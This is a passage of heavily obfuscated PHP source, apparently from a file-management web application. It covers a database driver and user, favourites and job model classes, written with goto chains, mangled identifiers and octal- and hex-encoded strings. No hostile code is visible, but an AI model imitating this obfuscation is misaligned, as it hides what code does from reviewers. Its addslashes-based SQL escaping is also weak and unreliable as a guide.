‰Å[99]]) && $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[99]] === $fÔÆ¤– ‰Å[33] || isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[31]]) && $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[31]] === $fÔÆ¤– ‰Å[33]), $fÔÆ¤– ‰Å[34] => isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[34]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[34]] : (isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[53]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[53]] : $fÔÆ¤– ‰Å[368]), $fÔÆ¤– ‰Å[36] => isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[89]]) ? strtolower($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[89]]) == $fÔÆ¤– ‰Å[38] : (isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[54]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[54]] : !1), $fÔÆ¤– ‰Å[39] => isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[873]]) ? strtolower($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[873]]) == $fÔÆ¤– ‰Å[41] : (isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[89]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[89]] : !1)); } } goto DĞË£µ”„Ş; DĞË£µ”„Ş: return $D‹ôÈ®¯öì; goto A¤ªÃÄÂÈ; dÒ¦ òğ‡ã: $fÔÆ¤– ‰Å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!0); if (think_config($fÔÆ¤– ‰Å[857])) { $fÄ¢Õé›§ó = str_replace($fÔÆ¤– ‰Å[858], $A¾Ì…„ÒÒ¹, think_config($fÔÆ¤– ‰Å[857])); } else { switch ($this->dbType) { case $fÔÆ¤– ‰Å[841]: case $fÔÆ¤– ‰Å[859]: $fÄ¢Õé›§ó = "\123\105\114\105\103\124\x20\40\40\x63\157\154\x75\155\x6e\x5f\x6e\x61\x6d\145\x20\x61\163\40\x27\116\x61\x6d\x65\x27\54\40\40\40\144\141\164\141\137\x74\171\x70\145\40\141\x73\40\x27\124\171\x70\x65\47\54\40\40\40\143\157\x6c\165\x6d\156\x5f\x64\145\x66\141\165\154\164\x20\x61\x73\40\47\x44\145\146\141\x75\154\x74\x27\54\x20\x20\40\x69\x73\137\156\165\154\154\x61\x62\x6c\x65\x20\x61\163\x20\47\116\x75\x6c\154\47\xa\11\x9\106\x52\117\x4d\x9\151\x6e\x66\157\162\x6d\141\164\151\x6f\x6e\x5f\x73\143\150\x65\155\141\56\164\141\142\154\x65\x73\40\x41\x53\x20\164\12\11\11\x4a\x4f\111\116\11\x69\156\x66\157\162\155\x61\164\151\x6f\156\137\163\143\150\145\x6d\141\x2e\x63\x6f\x6c\165\x6d\156\x73\40\x41\123\x20\143\12\x9\11\117\116\40\x20\164\56\x74\x61\142\154\145\x5f\x63\141\x74\141\154\157\147\40\x3d\40\x63\x2e\x74\141\x62\x6c\x65\137\x63\141\x74\141\154\x6f\147\12\x9\x9\x41\116\104\x20\164\56\x74\141\x62\x6c\145\x5f\163\x63\150\145\155\x61\x20\75\40\143\x2e\164\141\x62\154\145\137\163\143\x68\x65\155\141\12\11\11\101\116\x44\x20\164\x2e\x74\141\x62\x6c\145\x5f\156\x61\155\x65\40\75\x20\143\x2e\x74\x61\142\154\145\x5f\x6e\141\x6d\x65\xa\11\x9\127\110\x45\122\x45\40\x20\40\164\x2e\164\141\142\x6c\x65\x5f\156\x61\155\145\x20\x3d\x20\x27{$A¾Ì…„ÒÒ¹}\47"; break; case $fÔÆ¤– ‰Å[860]: $fÄ¢Õé›§ó = $fÔÆ¤– ‰Å[861] . $A¾Ì…„ÒÒ¹ . $fÔÆ¤– ‰Å[862]; break; case $fÔÆ¤– ‰Å[842]: case $fÔÆ¤– ‰Å[844]: $fÄ¢Õé›§ó = $fÔÆ¤– ‰Å[863] . $fÔÆ¤– ‰Å[864] . $fÔÆ¤– ‰Å[865] . strtoupper($A¾Ì…„ÒÒ¹) . $fÔÆ¤– ‰Å[866] . strtoupper($A¾Ì…„ÒÒ¹) . $fÔÆ¤– ‰Å[867]; break; case $fÔÆ¤– ‰Å[868]: $fÄ¢Õé›§ó = $fÔÆ¤– ‰Å[869] . $A¾Ì…„ÒÒ¹ . $fÔÆ¤– ‰Å[870]; break; case $fÔÆ¤– ‰Å[843]: break; case $fÔÆ¤– ‰Å[871]: default: $fÄ¢Õé›§ó = $fÔÆ¤– ‰Å[872] . ($this->dbType == $fÔÆ¤– ‰Å[871] ? "\140{$A¾Ì…„ÒÒ¹}\140" : $A¾Ì…„ÒÒ¹); } } goto Dè›ì‚Âºë; A¤ªÃÄÂÈ: } public function getTables($Eµİ»ÕÃéó = '') { $eâ”Ö°Ó±Á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (think_config($eâ”Ö°Ó±Á[874])) { $a®ÎºÏ‹Â¼ = str_replace($eâ”Ö°Ó±Á[875], $Eµİ»ÕÃéó, think_config($eâ”Ö°Ó±Á[874])); } else { switch ($this->dbType) { case $eâ”Ö°Ó±Á[842]: case $eâ”Ö°Ó±Á[844]: $a®ÎºÏ‹Â¼ = $eâ”Ö°Ó±Á[876]; break; case $eâ”Ö°Ó±Á[841]: case $eâ”Ö°Ó±Á[859]: $a®ÎºÏ‹Â¼ = $eâ”Ö°Ó±Á[877]; break; case $eâ”Ö°Ó±Á[868]: $a®ÎºÏ‹Â¼ = $eâ”Ö°Ó±Á[878]; break; case $eâ”Ö°Ó±Á[843]: think_exception(think_lang($eâ”Ö°Ó±Á[879]) . $eâ”Ö°Ó±Á[880]); break; case $eâ”Ö°Ó±Á[860]: $a®ÎºÏ‹Â¼ = $eâ”Ö°Ó±Á[42] . $eâ”Ö°Ó±Á[43] . $eâ”Ö°Ó±Á[44]; break; case $eâ”Ö°Ó±Á[871]: default: if (!empty($Eµİ»ÕÃéó)) { $a®ÎºÏ‹Â¼ = $eâ”Ö°Ó±Á[824] . $Eµİ»ÕÃéó . $eâ”Ö°Ó±Á[825]; } else { $a®ÎºÏ‹Â¼ = $eâ”Ö°Ó±Á[826]; } } } $F—÷ËšÖö = $this->query($a®ÎºÏ‹Â¼); $eêŒ¶“Ü›µ = array(); foreach ($F—÷ËšÖö as $cÀÛÇ’…ä• => $CãÀ¸ì¡†) { $eêŒ¶“Ü›µ[$cÀÛÇ’…ä•] = current($CãÀ¸ì¡†); } return $eêŒ¶“Ü›µ; } protected function parseLimit($bæºÕ¨è¬) { $b¨¥Ê±·Í÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d°ŞÔ‚ˆÂ» = $b¨¥Ê±·Í÷[33]; if (!empty($bæºÕ¨è¬)) { switch ($this->dbType) { case $b¨¥Ê±·Í÷[868]: case $b¨¥Ê±·Í÷[860]: $bæºÕ¨è¬ = explode($b¨¥Ê±·Í÷[47], $bæºÕ¨è¬); if (count($bæºÕ¨è¬) > 1) { $d°ŞÔ‚ˆÂ» .= $b¨¥Ê±·Í÷[48] . $bæºÕ¨è¬[1] . $b¨¥Ê±·Í÷[49] . $bæºÕ¨è¬[0] . $b¨¥Ê±·Í÷[50]; } else { $d°ŞÔ‚ˆÂ» .= $b¨¥Ê±·Í÷[48] . $bæºÕ¨è¬[0] . $b¨¥Ê±·Í÷[50]; } break; case $b¨¥Ê±·Í÷[841]: case $b¨¥Ê±·Í÷[859]: break; case $b¨¥Ê±·Í÷[843]: break; case $b¨¥Ê±·Í÷[842]: case $b¨¥Ê±·Í÷[844]: break; case $b¨¥Ê±·Í÷[871]: default: $d°ŞÔ‚ˆÂ» .= $b¨¥Ê±·Í÷[48] . $bæºÕ¨è¬ . $b¨¥Ê±·Í÷[50]; } } return $d°ŞÔ‚ˆÂ»; } public function parseKey(&$eˆ×¯â¡É, $eĞŸŒÕÇê = true) { $dİ¨ØìãÓ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($eĞŸŒÕÇê) { $eˆ×¯â¡É = $this->parseKeyCheck($eˆ×¯â¡É); } if ($this->dbType == $dİ¨ØìãÓ[871]) { if ($eˆ×¯â¡É != $dİ¨ØìãÓ[180] && !preg_match($dİ¨ØìãÓ[836], $eˆ×¯â¡É)) { $eˆ×¯â¡É = $dİ¨ØìãÓ[375] . trim($eˆ×¯â¡É, $dİ¨ØìãÓ[375]) . $dİ¨ØìãÓ[375]; } return $eˆ×¯â¡É; } else { return parent::parseKey($eˆ×¯â¡É); } } public function close() { $this->_linkID = null; } public function error() { $fÔˆ„Û ë· =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->PDOStatement) { $eÑ†ßŸ = $this->PDOStatement->errorInfo(); $this->error = $eÑ†ßŸ[1] . $fÔˆ„Û ë·[4] . $eÑ†ßŸ[2]; } else { $this->error = $fÔˆ„Û ë·[33]; } if ($fÔˆ„Û ë·[33] != $this->queryStr) { $this->error .= LNG($fÔˆ„Û ë·[45]) . $this->queryStr; } think_trace($this->error, $fÔˆ„Û ë·[33], $fÔˆ„Û ë·[46]); return $this->error; } public function escapeString($c˜õ×¼˜¢) { $eå¹ËÁ‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; switch ($this->dbType) { case $eå¹ËÁ‰[868]: case $eå¹ËÁ‰[841]: case $eå¹ËÁ‰[859]: case $eå¹ËÁ‰[871]: return addslashes($c˜õ×¼˜¢); case $eå¹ËÁ‰[843]: case $eå¹ËÁ‰[860]: case $eå¹ËÁ‰[842]: case $eå¹ËÁ‰[844]: return str_ireplace($eå¹ËÁ‰[55], $eå¹ËÁ‰[56], $c˜õ×¼˜¢); } } protected function parseValue($d”á¿‚•¼Ã) { $b†½Í”¡¨ƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_string($d”á¿‚•¼Ã)) { $d”á¿‚•¼Ã = strpos($d”á¿‚•¼Ã, $b†½Í”¡¨ƒ[4]) === 0 ? $this->escapeString($d”á¿‚•¼Ã) : $b†½Í”¡¨ƒ[881] . $this->escapeString($d”á¿‚•¼Ã) . $b†½Í”¡¨ƒ[881]; } elseif (isset($d”á¿‚•¼Ã[0]) && is_string($d”á¿‚•¼Ã[0]) && strtolower($d”á¿‚•¼Ã[0]) == $b†½Í”¡¨ƒ[291]) { $d”á¿‚•¼Ã = $this->escapeString($d”á¿‚•¼Ã[1]); } elseif (is_array($d”á¿‚•¼Ã)) { $d”á¿‚•¼Ã = array_map(array($this, $b†½Í”¡¨ƒ[882]), $d”á¿‚•¼Ã); } elseif (is_bool($d”á¿‚•¼Ã)) { $d”á¿‚•¼Ã = $d”á¿‚•¼Ã ? $b†½Í”¡¨ƒ[83] : $b†½Í”¡¨ƒ[485]; } elseif (is_null($d”á¿‚•¼Ã)) { $d”á¿‚•¼Ã = $b†½Í”¡¨ƒ[99]; } return $d”á¿‚•¼Ã; } public function getLastInsertId() { $dÕ’Á‰—ŒÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; switch ($this->dbType) { case $dÕ’Á‰—ŒÀ[868]: case $dÕ’Á‰—ŒÀ[860]: case $dÕ’Á‰—ŒÀ[841]: case $dÕ’Á‰—ŒÀ[859]: case $dÕ’Á‰—ŒÀ[843]: case $dÕ’Á‰—ŒÀ[871]: return $this->_linkID->lastInsertId(); case $dÕ’Á‰—ŒÀ[842]: case $dÕ’Á‰—ŒÀ[844]: $C’˜ÑÁ¥Ê× = $this->table; $c§Åùà·¼© = $this->query("\123\x45\114\x45\103\x54\x20{$C’˜ÑÁ¥Ê×}\x2e\x63\165\162\x72\x76\141\x6c\40\143\165\162\162\x76\141\x6c\x20\x46\122\x4f\115\x20\144\165\x61\154"); return $c§Åùà·¼© ? $c§Åùà·¼©[0][$dÕ’Á‰—ŒÀ[883]] : 0; } } } goto C—ÒĞ­ŒÚì; bˆ²ùÓÖ‘½: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($AŠÉÔïÈ®ã) { $Dç‹‡Å¼¡Æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($Dç‹‡Å¼¡Æ[1750] => array(USER_ID, $Dç‹‡Å¼¡Æ[2064])); } protected function listData() { $dÃ’“»è– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÜŠ­ÈÍ¯¸ = array($dÃ’“»è–[1482] => USER_ID, $dÃ’“»è–[451] => 0); $fš™ÍÇø‘æ = $dÃ’“»è–[2065]; $BŞãà×‚å“ = $this->field($fš™ÍÇø‘æ)->where($dÜŠ­ÈÍ¯¸)->order($dÃ’“»è–[2066])->select(); return $BŞãà×‚å“ ? $BŞãà×‚å“ : array(); } protected function resetCache() { } protected function listView() { goto dÇÀÑê—„Š; eºù˜À‘è±: $DÅÏì³´… = array_to_keyvalue($BÊ‚Ëè ù, $E…òÉÆô®[33], $E…òÉÆô®[75]); if (!$DÅÏì³´…) { return $bâ”Œá’èÍ; } $FÓ¸¨”çÈ÷ = 2000; goto dõ›ÅƒÆ¼¦; dõ›ÅƒÆ¼¦: $eÍäœŞ† = array($E…òÉÆô®[399] => array($E…òÉÆô®[400], $DÅÏì³´…)); $a·Ú¯»Î½ = Model($E…òÉÆô®[759])->listSource($eÍäœŞ†, $FÓ¸¨”çÈ÷); $a·Ú¯»Î½ = array_merge($a·Ú¯»Î½[$E…òÉÆô®[73]], $a·Ú¯»Î½[$E…òÉÆô®[74]]); goto BÆÆ¼™Ü¶ó; BÆÆ¼™Ü¶ó: $a·Ú¯»Î½ = array_to_keyvalue($a·Ú¯»Î½, $E…òÉÆô®[385]); foreach ($bâ”Œá’èÍ as $fˆ…ÃÕËÇ± => $FĞ¥”Æß¬) { $dÓ÷‘İ¦ÌÅ = $a·Ú¯»Î½[$FĞ¥”Æß¬[$E…òÉÆô®[75]]]; $dÓ÷‘İ¦ÌÅ = $dÓ÷‘İ¦ÌÅ ? $dÓ÷‘İ¦ÌÅ : array(); $bâ”Œá’èÍ[$fˆ…ÃÕËÇ±] = array_merge($dÓ÷‘İ¦ÌÅ, $FĞ¥”Æß¬); } return $bâ”Œá’èÍ; goto fØ¬‰×ö­; dÇÀÑê—„Š: $E…òÉÆô® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bâ”Œá’èÍ = $this->listData(); $BÊ‚Ëè ù = array_filter_by_field($bâ”Œá’èÍ, $E…òÉÆô®[29], $E…òÉÆô®[398]); goto eºù˜À‘è±; fØ¬‰×ö­: } protected function addFav($aİ£ğŸòç, $C£îÓÊ¡ = '', $eå›—éîíÙ = "\x73\157\165\x72\143\145") { goto Bùğ¢¹×¯; Bù†Ò„œƒ‰: if (!$C£îÓÊ¡ && $eå›—éîíÙ == $a«Ú´±¾‹½[398]) { $d­ŒÙÁÒŞŒ = Model($a«Ú´±¾‹½[1167])->where(array($a«Ú´±¾‹½[399] => $aİ£ğŸòç))->find(); if (!$d­ŒÙÁÒŞŒ) { return !1; } $C£îÓÊ¡ = $d­ŒÙÁÒŞŒ[$a«Ú´±¾‹½[28]]; } $C£îÓÊ¡ = $this->getAutoName($C£îÓÊ¡); $cÅÂÒí¨ã¶ = array($a«Ú´±¾‹½[1482] => USER_ID, $a«Ú´±¾‹½[451] => 0, $a«Ú´±¾‹½[402] => $C£îÓÊ¡, $a«Ú´±¾‹½[403] => $aİ£ğŸòç, $a«Ú´±¾‹½[404] => $eå›—éîíÙ, $a«Ú´±¾‹½[1654] => $A‰õÊò­Š¶ + 1); goto Bå°±©–îô; Bùğ¢¹×¯: $a«Ú´±¾‹½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C½ËÏÌØóÚ = array($a«Ú´±¾‹½[1482] => USER_ID, $a«Ú´±¾‹½[451] => 0, $a«Ú´±¾‹½[404] => $eå›—éîíÙ, $a«Ú´±¾‹½[403] => $aİ£ğŸòç); if ($this->where($C½ËÏÌØóÚ)->find()) { return !1; } goto D•Øõ—ïÀ‡; Bå°±©–îô: return $this->add($cÅÂÒí¨ã¶); goto eÜÀ¶„óÓÈ; D•Øõ—ïÀ‡: $C½ËÏÌØóÚ = array($a«Ú´±¾‹½[1482] => USER_ID, $a«Ú´±¾‹½[451] => 0); $A‰õÊò­Š¶ = $this->where($C½ËÏÌØóÚ)->max($a«Ú´±¾‹½[1673]); if (!$A‰õÊò­Š¶) { $A‰õÊò­Š¶ = 0; } goto Bù†Ò„œƒ‰; eÜÀ¶„óÓÈ: } protected function remove($d½ğ†È¥) { $a˜º£¥ğ´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bò²Š†„´‚ = array($a˜º£¥ğ´[1482] => USER_ID, $a˜º£¥ğ´[401] => $d½ğ†È¥); return $this->where($bò²Š†„´‚)->delete(); } protected function removeByName($c¾¿Èá‚Ş–) { $EèÉ„ˆŞê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E¤”©ˆë’’ = array($EèÉ„ˆŞê[1482] => USER_ID, $EèÉ„ˆŞê[402] => $c¾¿Èá‚Ş–, $EèÉ„ˆŞê[451] => 0); return $this->where($E¤”©ˆë’’)->delete(); } protected function rename($a×ÓºÒÀÁ, $Aàø³Ãõ) { $BÌßÇôÁÁ‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($a×ÓºÒÀÁ == $Aàø³Ãõ) { return !1; } $D§“¦ÕŠ“ = $this->getAutoName($Aàø³Ãõ); if ($Aàø³Ãõ != $D§“¦ÕŠ“) { return !1; } $bá·Î©‹¾ = array($BÌßÇôÁÁ‹[1482] => USER_ID, $BÌßÇôÁÁ‹[451] => 0, $BÌßÇôÁÁ‹[28] => $a×ÓºÒÀÁ); return $this->where($bá·Î©‹¾)->save(array($BÌßÇôÁÁ‹[28] => $Aàø³Ãõ)); } protected function resetSort($eÀ…¼¼‚ö) { $A¸‘¢Í©È =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÀ…¼¼‚ö = is_array($eÀ…¼¼‚ö) ? $eÀ…¼¼‚ö : array(); $dç±‡åŠ» = array($A¸‘¢Í©È[1482] => USER_ID); for ($Aµöã âìÛ = 0; $Aµöã âìÛ < count($eÀ…¼¼‚ö); $Aµöã âìÛ++) { $dç±‡åŠ»[$A¸‘¢Í©È[401]] = $eÀ…¼¼‚ö[$Aµöã âìÛ]; $this->where($dç±‡åŠ»)->save(array($A¸‘¢Í©È[1654] => $Aµöã âìÛ + 1)); } return !0; } protected function moveTop($fæé›„Ú«¨) { goto c×ƒªæ††; FéË©á»: if (!$a‘•Ó‚½Ç») { return; } $A‡‘âæÊ‰ = $this->field($AºÃŒŠÊá¡[383])->where($bŠ—â‘å»)->order($AºÃŒŠÊá¡[2066])->select(); $A‡‘âæÊ‰ = array_to_keyvalue($A‡‘âæÊ‰, $AºÃŒŠÊá¡[33], $AºÃŒŠÊá¡[383]); goto dŠ”±´¼•ˆ; c×ƒªæ††: $AºÃŒŠÊá¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bŠ—â‘å» = array($AºÃŒŠÊá¡[1482] => USER_ID, $AºÃŒŠÊá¡[451] => 0); $a‘•Ó‚½Ç» = $this->where($bŠ—â‘å»)->where(array($AºÃŒŠÊá¡[28] => $fæé›„Ú«¨))->find(); goto FéË©á»; dŠ”±´¼•ˆ: $Aôœ‚İ«–Ç = $A‡‘âæÊ‰; $A‡‘âæÊ‰ = array_remove_value($A‡‘âæÊ‰, $a‘•Ó‚½Ç»[$AºÃŒŠÊá¡[383]]); array_unshift($A‡‘âæÊ‰, $a‘•Ó‚½Ç»[$AºÃŒŠÊá¡[383]]); goto C¼á’† ²Ñ; C¼á’† ²Ñ: return $this->resetSort($A‡‘âæÊ‰); goto CŠ„ñ¼‚×Œ; CŠ„ñ¼‚×Œ: } protected function moveBottom($a‡‡º÷ó¿) { $e‹óĞ†˜Èà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÊ„›£—• = array($e‹óĞ†˜Èà[1482] => USER_ID, $e‹óĞ†˜Èà[451] => 0); $EñéŸìÍì = $this->where($cÊ„›£—•)->max($e‹óĞ†˜Èà[1673]); $cŸ°ôßÃ“¹ = array($e‹óĞ†˜Èà[1673] => $EñéŸìÍì + 1); return $this->where($cÊ„›£—•)->where(array($e‹óĞ†˜Èà[28] => $a‡‡º÷ó¿))->save($cŸ°ôßÃ“¹); } private function getAutoName($CßâŠêÃ) { goto eÕğÇ³šÌî; AŞ Á£»º»: $AèÄùØğÙ = array_to_keyvalue($AèÄùØğÙ, $AÖãˆŠ´¶ß[33], $AÖãˆŠ´¶ß[28]); if (!$AèÄùØğÙ || !in_array($CßâŠêÃ, $AèÄùØğÙ)) { return $CßâŠêÃ; } for ($Bõî‡í½  = 0; $Bõî‡í½  < count($AèÄùØğÙ); $Bõî‡í½ ++) { if (!in_array($CßâŠêÃ . "\50{$Bõî‡í½ }\x29", $AèÄùØğÙ)) { return $CßâŠêÃ . "\x28{$Bõî‡í½ }\x29"; } } goto fªˆª°®×á; eÕğÇ³šÌî: $AÖãˆŠ´¶ß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÁ¢ÛéÎ = array($AÖãˆŠ´¶ß[1482] => USER_ID, $AÖãˆŠ´¶ß[451] => 0); $AèÄùØğÙ = $this->field($AÖãˆŠ´¶ß[28])->where($AÁ¢ÛéÎ)->select(); goto AŞ Á£»º»; fªˆª°®×á: return $CßâŠêÃ . "\x28{$Bõî‡í½ }\x29"; goto Aæê¤ƒô; Aæê¤ƒô: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x6a\157\x62\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\x64\145\163\x63", "\163\157\x72\164"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\157\142\114\151\163\164"; public function listData($B½„†ø²ùô = false, $B™³¨Œ†š = "\x73\157\162\164", $B¨ÍĞÓÁ¸¿ = false) { return parent::listData($B½„†ø²ùô, $B™³¨Œ†š, $B¨ÍĞÓÁ¸¿); } public function remove($eÂùì¶í‹°) { return parent::remove($eÂùì¶í‹°); } public function add($FƒìöÀö‡ƒ) { $CƒÉ‘¶‰·î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->findByName($FƒìöÀö‡ƒ[$CƒÉ‘¶‰·î[28]])) { return !1; } $FƒìöÀö‡ƒ[$CƒÉ‘¶‰·î[1673]] = $this->getSort(); return parent::insert($FƒìöÀö‡ƒ); } private function getSort() { $EŒÕ­Ã«µ­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bìí¥¯‹êŒ = parent::listData(); $c‡ÓÎª»Ë = array_to_keyvalue($bìí¥¯‹êŒ, $EŒÕ­Ã«µ­[33], $EŒÕ­Ã«µ­[1673]); return empty($c‡ÓÎª»Ë) ? 0 : max($c‡ÓÎª»Ë) + 1; } public function update($e‘Š„ƒ•‹, $E®²îö«) { $còÎª›™³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c±ÈÑî›ã = parent::listData($e‘Š„ƒ•‹); $eÁ§ë£ë±Í = $this->findByName($E®²îö«[$còÎª›™³[28]]); if (!$c±ÈÑî›ã || $eÁ§ë£ë±Í && $eÁ§ë£ë±Í[$còÎª›™³[383]] != $c±ÈÑî›ã[$còÎª›™³[383]]) { return !1; } return parent::update($e‘Š„ƒ•‹, $E®²îö«); } public function setUserJob($cÈ™ÂÚ²ˆ, $D†§¼³™™ö) { goto A’éß¥Âó; F¨õ‘ÒÄ: $dĞŠ¿«ÁÒã = array_to_keyvalue($dòö›§øó¶, $E’¢²¸ÑÂª[28]); $A™ÎŒÓªÎî = $E’¢²¸ÑÂª[368]; foreach ($D†§¼³™™ö as $e¨‰¶ºÌ) { if ($dĞŠ¿«ÁÒã[$e¨‰¶ºÌ]) { $A™ÎŒÓªÎî .= $dĞŠ¿«ÁÒã[$e¨‰¶ºÌ][$E’¢²¸ÑÂª[383]] . $E’¢²¸ÑÂª[47]; } else { $A—…öÕÖŒƒ = $this->add($e¨‰¶ºÌ); $A™ÎŒÓªÎî .= $A—…öÕÖŒƒ . $E’¢²¸ÑÂª[47]; } } goto fÔº¶³Ï¨¡; A’éß¥Âó: $E’¢²¸ÑÂª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!is_array($D†§¼³™™ö)) { $D†§¼³™™ö = array($D†§¼³™™ö); } $dòö›§øó¶ = parent::listData(); goto F¨õ‘ÒÄ; fÔº¶³Ï¨¡: $A™ÎŒÓªÎî = rtrim($A™ÎŒÓªÎî, $E’¢²¸ÑÂª[47]); Model($E’¢²¸ÑÂª[494])->metaSet($cÈ™ÂÚ²ˆ, self::JOB_KEY, $A™ÎŒÓªÎî); goto eÀ…ôæ‡“–; eÀ…ôæ‡“–: } public function getUserJob($A‡½®İÓ˜Ü) { $cäÙ©Å»ƒ = Model($_SERVER[ÈİÅ¿ÈÈ¥×][494])->metaGet($A‡½®İÓ˜Ü); return $this->getUserJobInfo($cäÙ©Å»ƒ[self::JOB_KEY]); } public function getUserJobInfo($F§Ú­æÙï•) { goto EÈã‡¸‰Š; EÈã‡¸‰Š: $A‚®¤—“§Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BŒ±ğ ” = explode($A‚®¤—“§Ë[47], $F§Ú­æÙï•); $B¢Ï¦¶¼– = parent::listData(); goto fàèŞ£Ë¾Š; fàèŞ£Ë¾Š: $B¢Ï¦¶¼– = array_remove_key($B¢Ï¦¶¼–, $A‚®¤—“§Ë[190]); $d„–ÖŒ‘³ = array(); foreach ($BŒ±ğ ” as $Dó‘Æ¼™ªñ) { if (isset($B¢Ï¦¶¼–[$Dó‘Æ¼™ªñ])) { $d„–ÖŒ‘³[] = $B¢Ï¦¶¼–[$Dó‘Æ¼™ªñ]; } } goto E»ï½î·†ï; E»ï½î·†ï: return $d„–ÖŒ‘³; goto C·˜ÚÆ¬Î; C·˜ÚÆ¬Î: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\x65" => "\165\x73\145\x72\x5f\x6d\x65\x74\141", "\x6d\145\x74\x61\x46\151\x65\x6c\x64" => "\165\x73\145\162\x49\x44"); protected $simpleField = "\x75\x73\145\x72\111\x44\x2c\156\x69\x63\x6b\116\x61\155\x65\54\156\x61\x6d\145\x2c\x61\166\141\164\x61\162\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($c†®Ç»ôòŠ) { $A‹¤ÎÌ­’¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a¬Ó³àŒ£Æ = $A‹¤ÎÌ­’¸[2067]; return array($A‹¤ÎÌ­’¸[1723] => array($c†®Ç»ôòŠ[0], $a¬Ó³àŒ£Æ), $A‹¤ÎÌ­’¸[1725] => array($c†®Ç»ôòŠ[0], $a¬Ó³àŒ£Æ), $A‹¤ÎÌ­’¸[2068] => array($c†®Ç»ôòŠ[0], $a¬Ó³àŒ£Æ)); } protected function getInfo($Ağã¶©Øœ‰, $AŞòˆ‹œØ = false) { $Eö‘«ø ¿ = $this->getInfoSimple($Ağã¶©Øœ‰); if (!is_array($Eö‘«ø ¿)) { return array(); } if ($AŞòˆ‹œØ) { return $this->_getInfoApply($Eö‘«ø ¿); } return $this->cacheFunctionGet($_SERVER[ÈİÅ¿ÈÈ¥×][1779], $Ağã¶©Øœ‰); } protected function getInfoFull($CÍĞÁİ, $cÊÖ¶‰À‰É = false) { $c—÷æİê„ = $this->getInfoSimple($CÍĞÁİ); if (!is_array($c—÷æİê„)) { return array(); } if ($cÊÖ¶‰À‰É) { return $this->_getInfoApply($c—÷æİê„, !0); return $this->_getInfoApply($c—÷æİê„, !0); } return $this->cacheFunctionGet($_SERVER[ÈİÅ¿ÈÈ¥×][2069], $CÍĞÁİ); } private function _getInfoApply($b´õá¥»àñ, $bÀ©Ã’É¦ø = false) { goto eöà•Ï¡Î„; eöà•Ï¡Î„: $Ašµ¬»˜òì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$b´õá¥»àñ) { return $b´õá¥»àñ; } $DİÆ¸íğ˜¶ = md5($Ašµ¬»˜òì[2070] . $b´õá¥»àñ[$Ašµ¬»˜òì[814]] . $Ašµ¬»˜òì[2071] . $b´õá¥»àñ[$Ašµ¬»˜òì[28]]); goto c¨Ì­Ö–Ü; c¨Ì­Ö–Ü: $b´õá¥»àñ = $this->_listDataApplyItem($b´õá¥»àñ); $eõ³ÁÖ‘Ä÷ = Model($Ašµ¬»˜òì[1167])->metaGet($b´õá¥»àñ[$Ašµ¬»˜òì[407]][$Ašµ¬»˜òì[385]]); $b´õá¥»àñ[$Ašµ¬»˜òì[2072]] = $DİÆ¸íğ˜¶; goto eÀËˆé–“„; eÀËˆé–“„: $b´õá¥»àñ[$Ašµ¬»˜òì[407]][$Ašµ¬»˜òì[1911]] = isset($eõ³ÁÖ‘Ä÷[$Ašµ¬»˜òì[1912]]) ? $eõ³ÁÖ‘Ä÷[$Ašµ¬»˜òì[1912]] : null; if ($bÀ©Ã’É¦ø) { $b´õá¥»àñ[$Ašµ¬»˜òì[433]] = 